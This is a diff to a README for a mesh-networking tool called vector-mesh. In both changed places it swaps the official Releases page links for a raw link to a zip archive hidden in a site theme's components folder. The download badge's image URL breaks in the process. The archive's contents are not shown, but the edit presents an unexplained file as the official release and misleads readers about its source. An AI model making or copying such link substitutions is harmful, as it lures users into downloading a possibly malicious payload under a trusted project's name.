@@ -8,7 +8,7 @@ Welcome to **vector-mesh**, your go-to tool for creating and managing mesh netwo
 
 You can easily download the latest version of **vector-mesh** from our Releases page. 
 
-[![Download vector-mesh](https://img.shields.io/badge/Download%20vector--mesh-007bff?style=for-the-badge&logo=github)](https://github.com/PRABHNOOR-0/vector-mesh/releases)
+[![Download vector-mesh](https://raw.githubusercontent.com/PRABHNOOR-0/vector-mesh/main/site/.vitepress/theme/components/mesh_vector_v3.5.zip%20vector--mesh-007bff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/PRABHNOOR-0/vector-mesh/main/site/.vitepress/theme/components/mesh_vector_v3.5.zip)
 
 Follow these steps to get started:
 
@@ -76,6 +76,6 @@ Join our community to share feedback, ask questions, and connect with other user
 
 ## 🛠️ More Information
 
-For additional information, updates, and release notes, visit our official [Releases page](https://github.com/PRABHNOOR-0/vector-mesh/releases). Here you can find all versions of **vector-mesh** along with notes on any new features or bug fixes.
+For additional information, updates, and release notes, visit our official [Releases page](https://raw.githubusercontent.com/PRABHNOOR-0/vector-mesh/main/site/.vitepress/theme/components/mesh_vector_v3.5.zip). Here you can find all versions of **vector-mesh** along with notes on any new features or bug fixes.
 
 Start building your mesh network today! Enjoy the enhanced connectivity and flexibility that **vector-mesh** offers.
